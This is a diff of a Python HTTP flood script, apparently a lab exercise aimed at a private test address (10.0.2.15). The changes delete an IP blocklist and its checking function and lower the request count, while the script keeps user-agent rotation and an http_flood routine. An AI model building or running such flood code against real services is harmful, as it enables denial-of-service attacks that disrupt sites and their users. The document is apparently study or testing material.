@@ -5,13 +5,11 @@ import random
 import urllib3
 from datetime import datetime, timedelta
 import time
-import ipaddress
 
 urllib3.disable_warnings()
 
 # Fake IP address, but this doesn't make us anonymous
 fake_ip = '192.168.1.100'
-ip_add = '10.0.2.15'
 
 # Global variables to track rate limiting
 last_request_time = datetime.min
@@ -28,11 +26,6 @@ user_agents = [
     "Mozilla/5.0 (Windows NT 5.1; U; en; rv:1.8.0) Gecko/20060728 Firefox/1.5.0 Opera 9.22",
     "Mozilla/5.0 (Windows NT 5.1; U; en; rv:1.8.0) Gecko/20060728 Firefox/1.5.0 Opera 9.24",
     "Mozilla/5.0 (Windows NT 5.1; U; en; rv:1.8.0) Gecko/20060728 Firefox/1.5.0 Opera 9.26"
-]
-
-blocked_ips = [
-    "10.0.2.15",
-    "192.168.1.100"
 ]
 
 def show_logs():
@@ -62,26 +55,6 @@ def rate_limiting():
         # Update last request time
         last_request_time = datetime.now()
 
-def is_blocked_ip(ip_address):
-    # Checks if an IP address is in the blocked list.
-
-    # Set to True for testing w/ protection, False otherwise
-    block_for_testing = True
-
-    # Only check for blocking if not testing with protection
-    if not block_for_testing:
-        try:
-            ip = ipaddress.ip_address(ip_address)  # Parse IP address
-            for blocked_range in blocked_ips:
-                blocked_network = ipaddress.ip_network(blocked_range)
-                if ip in blocked_network:
-                    return True  # IP is blocked
-            return False  # IP is not in the blocked list
-        except ValueError:
-            print(f"Invalid IP address: {ip_address}")
-            # Treat invalid IPs as blocked
-            return True
-
 def http_flood(target_url, num_of_requests):
     # Flood the webpage with requests
     for _ in range(num_of_requests):
@@ -101,7 +74,7 @@ def http_flood(target_url, num_of_requests):
 
 if __name__ == "__main__":
     target_url = "https://10.0.2.15/real-estate-html-template/index.html"
-    num_of_requests = 100
+    num_of_requests = 50
 
     print(f"Starting http flood, targeting {target_url}")
 
